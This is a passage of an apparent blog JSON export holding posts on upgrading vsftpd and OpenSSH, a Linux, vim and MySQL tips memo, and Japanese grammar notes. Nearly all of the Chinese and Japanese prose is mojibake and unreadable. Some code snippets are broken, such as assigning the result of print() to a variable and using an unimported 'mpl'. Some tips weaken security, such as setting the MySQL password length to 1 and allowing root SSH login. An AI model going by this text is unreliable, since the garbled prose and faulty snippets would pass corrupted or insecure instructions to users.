è§£å‹åè¿›è¡Œåº“æ–‡ä»¶ç›¸å…³è®¾ç½®å®‰è£…ä¹‹å‰,å¦‚æœç³»ç»Ÿä¸º64ä½ï¼Œéœ€è¦æ›´æ”¹vsf_findlibs.shæ–‡ä»¶åº“ä¸­lib è·¯å¾„æ”¹ä¸ºlib64 1sed -i &#x27;s/lib\\//lib64\\//g&#x27; vsf_findlibs.sh ç¼–è¯‘å®‰è£…ç”±äºæ²¡æœ‰ç›¸å…³ä¾èµ–,å› æ­¤ä¸ç”¨è¿›è¡Œé¢„ç¼–è¯‘ 1make &amp;&amp; make install é…ç½®ä¿¡æ¯ä¿®æ”¹å› ä¸ºæ˜¯å‡çº§å®‰è£…ï¼Œéœ€è¦ä¿ç•™åŸæ¥vsftpçš„ç›¸å…³é…ç½®ï¼Œæ¥ä¸‹æ¥éœ€è¦å¤åˆ¶äº›æ–‡ä»¶åˆ°ç›¸åº”vsftpç›®å½•ã€‚å…·ä½“æ“ä½œå¦‚ä¸‹ï¼š 12cp vsftpd.conf /etc #é…ç½®ä¸»æ–‡ä»¶ cp RedHat/vsftpd.pam /etc/pam.d/ftp #PAM è®¤è¯æ–‡ä»¶ å¦‚æœç³»ç»Ÿä¸º64ä½ï¼Œè¯·å°†/etc/pam.d/ftp /libç›®å½•æ›¿æ¢ä¸º/lib64 1sed -i &#x27;s/lib\\//lib64\\//g&#x27; /etc/pam.d/ftp å°†ä»¥ä¸‹å†…å®¹å†™å…¥ /etc/vsftpd.conf 123anonymous_enable=NOlocal_enable=yeswrite_enable=YES å¯åŠ¨ vsftpd è¿›è¡Œæµ‹è¯•1vsftpd /etc/vsftpd.conf &amp; æŠŠ vsftpd åŠ å…¥åˆ°å¼€æœºå¯åŠ¨é¡¹ä¸­å°†ä»¥ä¸‹å†…å®¹å†™å…¥ /etc/rc.d/rc.local_enable 1vsftpd /etc/vsftpd.conf ä¿®æ”¹é…ç½®æ–‡ä»¶å¦‚ä¸‹é€‰é¡¹ï¼Œå¦‚æœæ²¡æœ‰ç›¸å…³é€‰é¡¹å’Œç›®å½•éœ€æ‰‹åŠ¨æ·»åŠ æˆ–åˆ›å»ºåˆ›å»º /usr/share/empty æ–‡ä»¶å¤¹å¹¶å°†ä»¥ä¸‹å†…å®¹å†™å…¥ /etc/vsftpd.conf 1secure_chroot_dir=/usr/share/empty æ³¨æ„ï¼šå¦‚é‡å¯åä¸èƒ½å¯åŠ¨æœåŠ¡ä¿®æ”¹ /etc/xinetd.d/vsftpd æ–‡ä»¶ï¼ŒæŠŠ disable=no æ”¹æˆ disable=yes å°±è¡Œäº† ç‰ˆæœ¬éªŒè¯1vsftpd -v å‚è€ƒè‡ª: https://blog.csdn.net/dbdeep/article/details/63037691","categories":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"vsftpd","slug":"è¿ç»´/vsftpd","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/vsftpd/"}],"tags":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"},{"name":"vsftpd","slug":"vsftpd","permalink":"https://tari.moe/tags/vsftpd/"}]},{"title":"Openssh upgrade, from 7.5 to 8.0p1","slug":"Openssh_upgrade_from_7.5_to_8.0p1","date":"2019-06-30T16:20:55.000Z","updated":"2021-04-02T02:17:28.356Z","comments":true,"path":"2019/07/01/Openssh_upgrade_from_7.5_to_8.0p1/","link":"","permalink":"https://tari.moe/2019/07/01/Openssh_upgrade_from_7.5_to_8.0p1/","excerpt":"","text":"è®°ä¸€æ¬¡OpenSSHå‡çº§è¿‡ç¨‹ç³»ç»Ÿç¯å¢ƒ: Ubuntu14.04sshd -Då…ˆæ˜¯ä¿®æ”¹sshdé…ç½®å…è®¸rootç™»å½•ï¼Œä½†æ˜¯é‡å¯ä¸äº† 1sudo service ssh restart æŸ¥çœ‹å¾—çŸ¥å­˜åœ¨ sshd -D è¿›ç¨‹å¹¶ç»ˆæ­¢å®ƒ 12ps -ef | grep sshsudo kill ID æœ€åå¼€å¯sshd 1sudo /usr/sbin/sshd -D å¯åŠ¨åå°±å¯ä»¥rootç™»å½•äº†emmmâ€¦. å¥½åƒå¯åŠ¨ååªèƒ½ç™»å½•ä¸€æ¬¡?é‚£è¯·è¯•è¯•: 1sudo /usr/sbin/sshd -t å¥½å¥‡çš„æˆ‘æƒ³çŸ¥é“-Dæ˜¯ä»€ä¹ˆæ„æ€â€¦ä½†çœ‹äº†è¯´æ˜ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆç³»åˆ—ã€‚ã€‚-D When this option is specified, sshd will not detach and does not become a daemon. This allows easy monitoring of sshd. ä¼šä¸ä¼šå’Œè¿™æœ‰å…³å‘¢? (æ‘˜è‡ªå®˜ç½‘)OpenSSH runs as two processes when connecting to other computers. The first process is a privileged process and controls the issuance of privileges as necessary. The second process communicates with the network. å¿«ç…§åˆ«å¿˜äº†å¤‡ä»½ã€åˆ«å¿˜äº†å¤‡ä»½ã€åˆ«å¿˜äº†å¤‡ä»½â€¦ å¸è½½åŸæœ¬OpenSSHç”±äºæˆ‘åŸæœ¬æ˜¯ç¼–è¯‘å®‰è£…çš„ï¼Œåˆ°åŸæœ¬ç¼–è¯‘å®‰è£…çš„ç›®å½•å¸è½½å°±å¯ä»¥äº† 1make uninstall ä¸‹è½½OpenSSHåˆ°å®˜ç½‘ä¸‹è½½å°±å¯ä»¥äº†http://www.openssh.com/releasenotes.html SHA1å€¼æ£€éªŒ1sha1sum openssh-8.0p1.tar.gz ç›¸å…³ä¾èµ–åŒ…pam pam-devel zlib zlib-devel openssl-devel æ³¨æ„ä¸‹ubuntuä¸‹pamæ˜¯ libpam0gã€pam-devel æ˜¯ libpam0g-devç¼–è¯‘å®‰è£…1./configure --prefix=/usr --sysconfdir=/etc/ssh --with-md5-passwords --with-pam --with-zlib --with-ssl-dir=/usr/local/ssl --with-privsep-path=/var/lib/sshd 1make &amp;&amp; make install é‡å¯æœåŠ¡å™¨ï¼Œæå®šï¼","categories":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"memo","slug":"memo","date":"2019-06-29T16:17:36.000Z","updated":"2021-04-02T02:17:01.656Z","comments":true,"path":"2019/06/30/memo/","link":"","permalink":"https://tari.moe/2019/06/30/memo/","excerpt":"","text":"è®°å½• linux ä¸€äº›å¸¸è§é—®é¢˜ä¸€ã€æŸç«¯å£æ˜¯å¦è¢« Linux é˜²ç«å¢™é˜»æ­¢-L: æŸ¥çœ‹ç®¡ç†å‘½ä»¤å­å‘½ä»¤:&emsp;-nï¼šä»¥æ•°å­—çš„æ–¹å¼æ˜¾ç¤ºipï¼Œå®ƒä¼šå°†ipç›´æ¥æ˜¾ç¤ºå‡ºæ¥ï¼Œå¦‚æœä¸åŠ -nï¼Œåˆ™ä¼šå°†ipåå‘è§£ææˆä¸»æœºåã€‚&emsp;-vï¼šæ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ 1iptables -vnL | grep &#x27;:port&#x27; äºŒã€^å­—ç¬¦å¯¹ä¸Šä¸€ä¸ªå‘½ä»¤çš„æ–‡æœ¬æ›¿æ¢å¹¶é‡æ–°æ‰§è¡Œå‘½ä»¤^before^after^ ä¸‰ã€vimç³»åˆ— vim å­—ç¬¦ä¸²æ›¿æ¢ 12345678910111213141516171819:s/well/good/ æ›¿æ¢å½“å‰è¡Œç¬¬ä¸€ä¸ªwell ä¸º good:s/well/good/g æ›¿æ¢å½“å‰è¡Œæ‰€æœ‰well ä¸º good:n,$s/well/good/ æ›¿æ¢ç¬¬ n è¡Œå¼€å§‹åˆ°æœ€åä¸€è¡Œä¸­æ¯ä¸€è¡Œçš„ç¬¬ä¸€ä¸ª well ä¸º good:n,$s/well/good/g æ›¿æ¢ç¬¬ n è¡Œå¼€å§‹åˆ°æœ€åä¸€è¡Œä¸­æ¯ä¸€è¡Œæ‰€æœ‰ well ä¸º goodn ä¸ºæ•°å­—ï¼Œè‹¥ n ä¸º .ï¼Œè¡¨ç¤ºä»å½“å‰è¡Œå¼€å§‹åˆ°æœ€åä¸€è¡Œ:%s/well/good/ ï¼ˆç­‰åŒäº :g/well/s//good/ï¼‰ æ›¿æ¢æ¯ä¸€è¡Œçš„ç¬¬ä¸€ä¸ª well ä¸º good:%s/well/good/g ï¼ˆç­‰åŒäº :g/well/s//good/gï¼‰ æ›¿æ¢æ¯ä¸€è¡Œä¸­æ‰€æœ‰ well ä¸º goodç‰¹æ®Šç¬¦å·è½¬ä¹‰ï¼šå¯ä»¥ä½¿ç”¨#ä½œä¸ºåˆ†éš”ç¬¦ï¼Œæ­¤æ—¶ä¸­é—´å‡ºç°çš„ / ä¸ä¼šä½œä¸ºåˆ†éš”ç¬¦:s#well/#good/# æ›¿æ¢å½“å‰è¡Œç¬¬ä¸€ä¸ª well/ ä¸º good/:%s#/usr/bin#/bin#g å¯ä»¥æŠŠæ–‡ä»¶ä¸­æ‰€æœ‰è·¯å¾„/usr/binæ¢æˆ/bin vim ä¹±ç é—®é¢˜å…¶ä¸­-bä¸€èˆ¬æ˜¯ç”¨æ¥æŸ¥çœ‹å¯¹åº”çš„äºŒè¿›åˆ¶æ–‡ä»¶ 1vim -b file vim tab è®¾ç½®ä¸º4ä¸ªç©ºæ ¼vimrcæ–‡ä»¶æœ«å°¾åŠ ä¸Š 123set ts=4set expandtabset autoindent vim å¤šè¡Œæ³¨é‡Š é¦–å…ˆæŒ‰ esc è¿›å…¥å‘½ä»¤è¡Œæ¨¡å¼ä¸‹ï¼ŒæŒ‰ä¸‹ Ctrl + vï¼Œè¿›å…¥åˆ—ï¼ˆä¹Ÿå«åŒºå—ï¼‰æ¨¡å¼; åœ¨è¡Œé¦–ä½¿ç”¨ä¸Šä¸‹é”®é€‰æ‹©éœ€è¦æ³¨é‡Šçš„å¤šè¡Œ; æŒ‰ä¸‹é”®ç›˜ï¼ˆå¤§å†™ï¼‰â€œIâ€ é”®ï¼Œè¿›å…¥æ’å…¥æ¨¡å¼ï¼› ç„¶åè¾“å…¥æ³¨é‡Šç¬¦ï¼ˆâ€œ//â€ã€â€œ#â€ç­‰ï¼‰; æœ€åæŒ‰ä¸‹ â€œEscâ€ é”®ã€‚ æ³¨ï¼šåœ¨æŒ‰ä¸‹escé”®åï¼Œä¼šç¨ç­‰ä¸€ä¼šæ‰ä¼šå‡ºç°æ³¨é‡Šï¼Œä¸è¦ç€æ€¥æ—¶é—´å¾ˆçŸ­çš„~ vim å»æ‰é«˜äº®åº•è‰²è¿›å…¥å‘½ä»¤æ¨¡å¼, è¾“å…¥ 1:nohl vim é™¤äº† i o å¤–çš„å…¶ä»–æ’å…¥ I åœ¨å…‰æ ‡å½“å‰è¡Œå¼€å§‹æ’å…¥ a åœ¨å…‰æ ‡åæ’å…¥ A åœ¨å…‰æ ‡å½“å‰è¡Œæœ«å°¾æ’å…¥ O åœ¨å…‰æ ‡å½“å‰è¡Œçš„ä¸Šä¸€è¡Œæ’å…¥æ–°è¡Œ vim å®šä½å‘½ä»¤ :set nu æ˜¾ç¤ºè¡Œå· :set nonu å–æ¶ˆè¡Œå· vim æ›¿æ¢å’Œå–æ¶ˆå‘½ä»¤ r æ›¿æ¢å…‰æ ‡æ‰€åœ¨å¤„çš„å­—ç¬¦ R ä»å…‰æ ‡æ‰€åœ¨å¤„å¼€å§‹æ›¿æ¢,æŒ‰Escé”®ç»“æŸ vim åˆ é™¤å‘½ä»¤(ä¸€ç›´å‚»å‚»çš„æŒ‰è¿œè¿œçš„delé”®..) x åˆ é™¤å…‰æ ‡æ‰€åœ¨å¤„å‘½ä»¤ nx åˆ é™¤å…‰æ ‡æ‰€åœ¨å¤„åçš„nä¸ªå­—ç¬¦ dG åˆ é™¤å…‰æ ‡æ‰€åœ¨è¡Œåˆ°æœ«å°¾è¡Œçš„æ‰€æœ‰å†…å®¹ D åˆ é™¤å…‰æ ‡æ‰€åœ¨å¤„åˆ°è¡Œå°¾çš„å†…å®¹ :n,md åˆ é™¤åˆ¶å®šèŒƒå›´çš„è¡Œ vim å¸¸ç”¨å¿«æ·é”® Shift + zz ä¿å­˜é€€å‡º, ä¸ â€œ:wqâ€ ä½œç”¨ç›¸åŒ V è¿›å…¥è¡Œå¯è§†æ¨¡å¼ Ctrl + v è¿›å…¥å—å¯è§†æ¨¡å¼ vim é¼ æ ‡å³é”®ä¸èƒ½å¤åˆ¶ç²˜è´´ï¼Œè€Œæ˜¯åˆ‡ä¸ºå¯è§†åŒ–æ¨¡å¼ å…¨å±€æ”¹å˜ vim /etc/vimrc ä»…æ”¹å˜å½“å‰ç”¨æˆ· vim ~/.vimrc æ³¨æ„äº‹é¡¹: source è¿™ä¸€è¡Œçš„åŠŸèƒ½æ˜¯åŠ è½½é»˜è®¤é…ç½®ï¼Œä¸€å®šè¦å…ˆç¡®å®šè¯¥æ–‡ä»¶è·¯å¾„å­˜åœ¨ (æ ¹æ®vimç‰ˆæœ¬ç¡®å®vim7*,8*)ï¼Œå¦åˆ™å¯èƒ½ä¼šå¯¼è‡´ vim ä¸å¯ç”¨12345source /usr/share/vim/vim81/defaults.vimlet skip_defaults_vim = 1if has(&#x27;mouse&#x27;) set mouse-=aendif é‡æ–°æ‰“å¼€ vim å°±å¯ä»¥æ­£å¸¸ä½¿ç”¨é¼ æ ‡å³é”®å¤åˆ¶ç²˜è´´äº† è½¬è½½è‡ª: https://xirikm.net/2019/504-1.html å…«ã€linuxç»ˆç«¯é”å±ä¸è§£é”ctrl+s é”å±ctrl+q è§£é” ä¹ã€Sublime Text 3 å‚ç›´é€‰å–Shift+é¼ æ ‡å³é”® åã€MySQLç»Ÿè®¡æ‰€ä»¥åº“æ•°æ®å¤§å°ï¼ˆæœ‰ç‚¹æ…¢å–”ï¼‰12345SELECT TABLE_SCHEMA, concat(TRUNCATE(sum(data_length)/1024/1024,2),&#x27;MB&#x27;) AS data_size,concat(TRUNCATE(sum(index_length)/1024/1024,2),&#x27;MB&#x27;) AS index_sizeFROM information_schema.TABLESGROUP BY TABLE_SCHEMAORDER BY data_length DESC; åä¸€ã€ç”¨æˆ·åŠ ç»„1usermod -aG group user åäºŒã€æ¢æµ‹æœåŠ¡æ˜¯å¦å·²ç»å¯åŠ¨, è¿è¡Œæ˜¯å¦æ­£å¸¸1killall -0 service åä¸‰ã€deb å’Œ rpm åŒ…ä¹‹é—´çš„è½¬æ¢1sudo apt install alien åå››ã€æŸ¥çœ‹è‡ªå·±çš„ pts1who am i åäº”ã€åˆ›å»ºç›®å½•ç»“æ„12# -v æ˜¾ç¤ºåšäº†ä»€ä¹ˆmkdir -pv path/&#123;dir1, dir2, ...&#125; åå…­ã€æŸ¥çœ‹ nginx çš„ç»„å’Œç”¨æˆ·å¹¶é”å®šå…¶ä¸èƒ½ç”¨ ssh ç™»å½•12345678# æŸ¥çœ‹ç»„getent group nginx# æŸ¥çœ‹ç”¨æˆ·getent passwd nginx# æŸ¥çœ‹nginxå±äºå“ªä¸ªç»„id nginx# é”å®š nginx ä¸èƒ½ç™»å½•usermod -s /sbin/nologin nginx åä¸ƒã€é”å®šnginxç”¨æˆ·ä¸èƒ½ç™»å½•1passwd -l åå…«ã€mysqlå¯†ç å¼ºåº¦è®¾ç½®1234mysql&gt; set global validate_password_policy=0;mysql&gt; set global validate_password_length=1;# è®¾ç½® root&#x27;@&#x27;localhost çš„å¯†ç ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;new password&#x27;; åä¹ã€MySQLæŸ¥çœ‹æ‰€æœ‰è¿æ¥çš„å®¢æˆ·ç«¯ip1234567891011SELECT user, host from mysql.user;# æˆ–è€…SELECT substring_index(HOST, &#x27;:&#x27;, 1) AS host_name, state, count(*)FROM information_schema. PROCESSLISTGROUP BY state, host_name; äºŒåã€ç¼–ç è½¬æ¢1234# åœ¨ linux ä¸‹æ‰“å¼€ windows çš„ txt å¯èƒ½ä¹±ç iconv -f GBK -t UTF-8 æ–‡ä»¶åå­—# gedit ä¹±ç å¯å°è¯•gsettings set org.gnome.gedit.preferences.encodings candidate-encodings &quot;[&#x27;GB18030&#x27;, &#x27;UTF-8&#x27;, &#x27;CURRENT&#x27;, &#x27;ISO-8859-15&#x27;, &#x27;UTF-16&#x27;]&quot; äºŒåä¸€ã€æ‰¹é‡å›¾ç‰‡å¤§å°è½¬æ¢1find ./ -name &#x27;*.jpg&#x27; -exec convert -resize 1100x2200 &#123;&#125; &#123;&#125; \\; äºŒåä¸€ã€äº” å¼„ä¸€ä¸ªè¯»å–é€Ÿåº¦å¾ˆå¿«å¾ˆå¿«çš„å°ç¡¬ç›˜12mkdir -p /mnt/rammount -t tmpfs tmpfs /mnt/ram -o size=8192M äºŒåäºŒã€donâ€™t add command to history (note the leading space)1echo &quot;Am I like a hacker?&quot; äºŒåä¸‰ã€exit terminal but leave all processes running1disown -a &amp;&amp; exit äºŒåå››ã€script å›æ”¾1234# å¼€å§‹å½•åƒï¼Œctrl+dæˆ–è€…exitç»“æŸscript -t 2&gt;demo.time -a demo.his# å›æ”¾scriptreplay demo.time demo.his äºŒåäº”ã€ æœç´¢å†å²è®°å½•ctrl + ræˆ‘å¤©ï¼Œè¿™ä¹ˆå¥½ç”¨çš„å‘½ä»¤æˆ‘å±…ç„¶ä¸€ç›´å¾ˆå°‘ç”¨ã€‚ã€‚ã€‚ äºŒåå…­ã€ V2ray1234567# ç³»ç»Ÿæ—¶é—´sudo date -s 2019/10/27 sudo date -s 16:36:10# æˆ–sudo pacman -S openntpdsudo systemctl enable openntpdsudo systemctl start openntpd äºŒåä¸ƒã€archlinux vmware12# æ¯æ¬¡æ›´æ–°å®Œå†…æ ¸éƒ½è¦ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤é‡æ–°ç¼–è¯‘å†…æ ¸æ¨¡å—çš„sudo vmware-modconfig --console --install-all äºŒåå…«ã€linuxå†™å…¥ ntfs æ–‡ä»¶éœ€è¦å®‰è£… ntfs-3g äºŒåä¹ã€sudo git å¯¼è‡´rootç”¨æˆ·å’Œå…¶ä»–ç”¨æˆ·gité…ç½®ä¸ä¸€è‡´sudo ä¹Ÿä¸æ˜¯ä¹±ç”¨çš„æ™•ã€‚ã€‚ã€‚ 1234567891011*** Please tell me who you are.Run git config --global user.email &quot;you@example.com&quot; git config --global user.name &quot;Your Name&quot;to set your account&#39;s default identity.Omit --global to set the identity only in this repository.fatal: unable to auto-detect email address (got &#39;root@****.(none)&#39;) ä¸‰åã€ archlinux ä¸­ä¸€ä¸ªç½‘å¡å¤šipå¯èƒ½ä¼šå¯¼è‡´ä¸åŒæœåŠ¡ipå†²çªå¯¼è‡´ç½‘é€Ÿä¸‹é™123456789# æŸ¥çœ‹ä¸€ä¸ªç½‘å¡æ˜¯å¦å­˜åœ¨å¤šä¸ªipip addr# å¦‚æœå­˜åœ¨å¤šä¸ª ip å¯èƒ½æ˜¯ç³»ç»Ÿè£…æœ‰å¤šä¸ªç½‘ç»œç®¡ç†é€ æˆçš„, æˆ‘æ˜¯æŠŠ dhcpcd å…³äº† å† é…åˆé™æ€ipå°±å¥½äº†systemctl stop dhcpcdsystemctl disable dhcpcd# ç„¶åé‡å¯shutdown -r now ä¸‰åä¸€ã€ linux ä¸‹ pycharm ç”¨ matplotlib åº“ä¸­æ–‡ä¹±ç  åŠ å‡å·æ–¹å—é—®é¢˜123# æŸ¥çœ‹ matplotlib å­—ä½“åŠé…ç½®æ–‡ä»¶ç›®å½•import matplotlib CONFIG_DIR = print(matplotlib.matplotlib_fname()) 1234567891011121314# https://fontzone.net/download/simhei ä¸‹è½½ simhei å­—ä½“# æŠŠå­—ä½“æ‹·è´åˆ° matplotlib å­—ä½“ç›®å½•# è¦æ³¨æ„ä½ æ–°ä¸‹è½½å­—ä½“çš„ç”¨æˆ·åŠç”¨æˆ·ç»„çš„æƒé™å’Œè¯¥ç›®å½•ä¸‹ä¸€è‡´cp DOWNLOAD_DIR/simhei.ttf CONFIG_DIR/fonts/ttf/ vim CONFIG_DIR/matplotlibrc # matplotlib é…ç½®æ–‡ä»¶ç›®å½•# æ‰¾åˆ°ç›¸åº”ä½ç½®å¹¶ ä¿®æ”¹ä¸ºä¸‹é¢ä¸‰é¡¹font.family : sans-seriffont.sans-serif : SimHei, Bitstream Vera Sans, Lucida Grande, Verdana, Geneva, Lucid, Arial, Helvetica, Avant Garde, sans-serifaxes.unicode_minus:False #ä½œç”¨å°±æ˜¯è§£å†³è´Ÿå·&#x27;-&#x27;æ˜¾ç¤ºä¸ºæ–¹å—çš„é—®é¢˜# åˆ é™¤åŸæœ¬å­—ä½“ç¼“å­˜cd ~/.cache/matplotlibrm -rf *.* 12345678# coding: utf-8import matplotlib.pyplot as pltplt.rcParams[&#x27;font.sans-serif&#x27;] = [&#x27;SimHei&#x27;]mpl.rcParams[&#x27;axes.unicode_minus&#x27;] = False# åº”è¯¥å°± OK äº†","categories":[{"name":"å°è®°","slug":"å°è®°","permalink":"https://tari.moe/categories/%E5%B0%8F%E8%AE%B0/"}],"tags":[{"name":"å°è®°","slug":"å°è®°","permalink":"https://tari.moe/tags/%E5%B0%8F%E8%AE%B0/"}]},{"title":"ã€ŒåŠ©è©ã€","slug":"ã€ŒåŠ©è©ã€","date":"2019-06-29T08:42:22.000Z","updated":"2021-04-02T02:13:34.661Z","comments":true,"path":"2019/06/29/ã€ŒåŠ©è©ã€/","link":"","permalink":"https://tari.moe/2019/06/29/%E3%80%8C%E5%8A%A9%E8%A9%9E%E3%80%8D/","excerpt":"","text":"åŠ©è©ã€Œã¯ã€lâ€” ä¸»èªã¯ ä¸€ä¸ªå¥å­åªèƒ½æœ‰ä¸€ä¸ªlâ€” è¡¨ç¤ºåŒºåˆ«å¯¹æ¯”ä¾‹ï¼šæ˜æ—¥ã¯åƒãã¾ã›ã‚“ ç§ã¯é‡èœã¨é­šã‚’é£Ÿã¹ã¾ã™ã€‚è‚‰ã¯é£Ÿã¹ã¾ã›ã‚“ [ç§ã¯]åœŸæ›œæ—¥ã¯å‹é”ã¨é£Ÿäº‹ã—ã¾ã™ã€‚æ—¥æ›œæ—¥ã¯åƒãã¾ã™ åŠ©è©ã€Œã«ã€lâ€” è¡¨ç¤ºå‹•ä½œé€²è¡Œæ™‚ç‚¹ å…·ä½“æ—¶é—´è¦æ”¾ã€Œã«ã€ï¼ˆå…«æ™‚ã«ã€åˆå¾Œå››æ™‚ã«ï¼‰ã€œ ã¾ã™ä¾‹ï¼šï¼‘ï¼æ™‚ã«å‹é”ã¨é£Ÿäº‹ã—ã¾ã™ã€‚ æ³›æŒ‡æ—¶é—´ä¸ç”¨æ”¾ã€Œã«ã€ï¼ˆæ˜æ—¥ï¼‰ã€œ ã¾ã™ å¯æ”¾å¯ä¸æ”¾ã€Œã«ã€æœˆæ›œæ—¥ ç«æ›œæ—¥ æ°´æ›œæ—¥ æœ¨æ›œæ—¥ é‡‘æ›œæ—¥ åœŸæ›œæ—¥ æ—¥æ›œæ—¥ lâ€” è¡¨ç¤ºå­˜åœ¨ä½ç½® é‡ç‚¹æ˜¯ ä¸œè¥¿æˆ–äºº/åŠ¨ç‰© å­˜åœ¨ä½ç½® + ã« + ä¸œè¥¿ + ãŒ ã‚ã‚Šã¾ã™ä¾‹ï¼šæœºã®ä¸Šã«ãƒªãƒ³ã‚´ãŒã‚ã‚Šã¾ã™ aï¼šäº¬éƒ½ã«ä½•ãŒã‚ã‚Šã¾ã™ bï¼šå¤ã„ãŠå¯ºã‚„ç¥ç¤¾[ãªã©]ãŒ ã‚ã‚Šã¾ã™ å­˜åœ¨ä½ç½® + ã« + äºº/åŠ¨ç‰© + ãŒ ã„ã¾ã™ä¾‹ï¼šã‚ãã“ã«å­ä¾›ãŒã„ã¾ã™ aï¼šéƒ¨å±‹ã«èª°ãŒã„ã¾ã™ bï¼šç”°ä¸­ã•ã‚“ãŒã„ã¾ã™ é‡ç‚¹æ˜¯ ä½ç½® ä¸œè¥¿ + ã¯ + å­˜åœ¨ä½ç½® + ã« + ãŒ ã‚ã‚Šã¾ã™ä¾‹ï¼šaï¼šãƒˆã‚¤ãƒ¬ã¯ã©ã“ã«ã‚ã‚Šã¾ã™ã‹&emsp;&emsp;bï¼š2éšã«ã‚ã‚Šã¾ã™/2éšã§ã™ äºº/åŠ¨ç‰© + ã¯ + å­˜åœ¨ä½ç½® + ã« + ãŒ ã„ã¾ã™ä¾‹ï¼šaï¼šç”°ä¸­ã•ã‚“ã¯ã©ã“ã«ã„ã¾ã™ã‹&emsp;&emsp;bï¼šï¼¿ï¼¿ï¼¿ï¼¿ï¼¿ä¼šè­°å®¤ã«ã„ã¾ã™ lâ€” å½“åŠ¨ä½œä¸€ä¸ªäººå®Œæˆä¸äº†æ—¶åŠ¨ä½œä¸» + ã¯ + åŠ¨ä½œå¯¹æ–¹ + ã« +åŠ¨ä½œå¯¹è±¡ + ã‚’ + åŠ¨è¯ä¾‹ï¼šç§ã¯å‹é”ã«é›»è©±ã‚’æ›ã‘ã¾ã—ãŸ&emsp;&emsp;[ç§ã¯]å‹é”ã«CDã‚’è²¸ã—ã¾ã—ãŸ&emsp;&emsp;ç§ã¯FAXã§ä¼šç¤¾ã«ãƒ¬ãƒãƒ¼ãƒˆã‚’é€ã‚Šã¾ã—ãŸ ä¾‹ï¼šç§ã¯æ¯ã«ã‚«ãƒ¼ãƒ‰ã‚’ã‚ã’ã¾ã—ãŸ&emsp;&emsp;ç§ã¯æ¯ã«ã‚»ãƒ¼ã‚¿ãƒ¼ã‚’è²°ã„ã¾ã—ãŸ æ”¶åˆ°&emsp;&emsp;æ¯ã¯ç§ã«ã‚»ãƒ¼ã‚¿ãƒ¼ã‚’ãã‚Œã¾ã—ãŸ ç»™(æˆ‘)&emsp;&emsp;Ã— æ¯ã¯ç§ã«ã‚»ãƒ¼ã‚¿ãƒ¼ã‚’ã‚ã’ã¾ã—ãŸ&emsp;&emsp;å› ä¸ºæ—¥æœ¬äººæ¯”è¾ƒè°¦è™š, ç»™åˆ«äººçš„æ—¶å€™è¦ ã€Œä¸Šã’ã€, å°±æ˜¯æ¯”è¾ƒç†Ÿçš„äººä¹Ÿæ˜¯å¦‚æ­¤, åˆ«äººç»™æˆ‘æ—¶æ˜¯ ã€Œã‚¯ãƒ¬ã€&emsp;&emsp;ä¾‹ï¼šå‹é”ã¯ç§ã®å¦¹ã«æœ¬ã‚’ãã‚Œã¾ã—ãŸ&emsp;&emsp;&emsp;&emsp;ç§ã¯çˆ¶ã«ãƒã‚¯ã‚¿ã‚¤ã‚’ã‚ã’ã¾ã—ãŸ lâ€” è¡¨ç¤ºåˆ†é…æ™‚é–“æœŸé–“ + ã« + æ¬¡æ•° ä¾‹ï¼šä¸€é€±é–“ã«ï¼’å›æ—¥æœ¬èªã‚’å‹‰å¼·ã—ã¾ã™aï¼šä¸€å‘¨é–“ã«ä½•å›è‹±èªã‚’å‹‰å¼·ã—ã¾ã™ã‹bï¼š4å›å‹‰å¼·ã—ã¾ã™ã€‚1å›ã«4æ™‚é–“å‹‰å¼·ã—ã¾ã™aï¼šã˜ã‚ƒã‚ã€ä¸€é€±é–“ã«ï¼‘ï¼–æ™‚é–“ã§ã™ã­ã€‚ã™ã”ã„ã§ã™ã­ åŠ©è©ã€Œã§ã€lâ€” è¡¨ç¤ºå‹•ä½œé€²è¡Œåœ°ç‚¹ å ´æ‰€ + ã§ + å‹•è© ã€œ ã¾ã™åœ¨â€¦ä¾‹ï¼šé§…ã®å‰ã§ä¼šã„ã¾ã—ã‚‡ã†ã€‚ ä¸€ä¸ªäººåšä»€ä¹ˆä»€ä¹ˆä¸€äººã§ è¡¨ç¤ºäº¤é€šå·¥å…·ï¼ˆæ­ä¹˜ï½ï¼Œå¼€ï½ï¼Œéª‘ï½ï¼Œ åï½ï¼‰ä¾‹ï¼šé›»è»Šã§è¡Œãã¾ã™ è¦æ­ç”µè½¦å» lâ€” ç”¨â€¦å·¥å…·(æ–¹æ³•)ä¾‹ï¼šç§ã¯FAXã§ä¼šç¤¾ã«ãƒ¬ãƒãƒ¼ãƒˆã‚’é€ã‚Šã¾ã—ãŸ åŠ©è©ã€Œã¨ã€lâ€” å’Œï¼ˆè·Ÿï¼‰â€¦ä¾‹ï¼šæ—¥æ›œæ—¥ã€[ã‚ãªãŸã¯]èª°ã¨é£Ÿäº‹ã—ã¾ã™ã‹ã€‚ [ç§ã¯]é«˜æ ¡æ™‚ä»£ã®å‹é”ã¨é£Ÿäº‹ã—ã¾ã™ã€‚ lâ€” è¡¨å¹¶åˆ— å’Œ æœºã®ä¸Šã«æœ¬ã¨ãƒãƒ¼ãƒˆãŒã‚ã‚Šã¾ã™ è¡¨ç¤ºæ¡Œå­ä¸Šåªæœ‰ä¹¦å’Œå¤‡å¿˜å½• æœºã®ä¸Šã«æœ¬ã‚„ãƒãƒ¼ãƒˆ[ãªã©(ç­‰)]ãŒã‚ã‚Šã¾ã™ è¡¨ç¤ºæ¡Œå­ä¸Šæœ‰ä¹¦ã€å¤‡å¿˜å½•ç­‰ åŠ©è©ã€Œã‚’ã€ è¡¨ç¤ºåŠ¨ä½œä½œç”¨å¯¹è±¡(çœ‹å¾—è§çš„åŠ¨ä½œ) å¯¾è±¡ + ã‚’ + å‹•ä½œä¾‹ï¼šæ—¥æœ¬èªã‚’å‹‰å¼·ã—ã¾ã™ åŠ©è©ã€ŒãŒã€ å¯¾è±¡ + 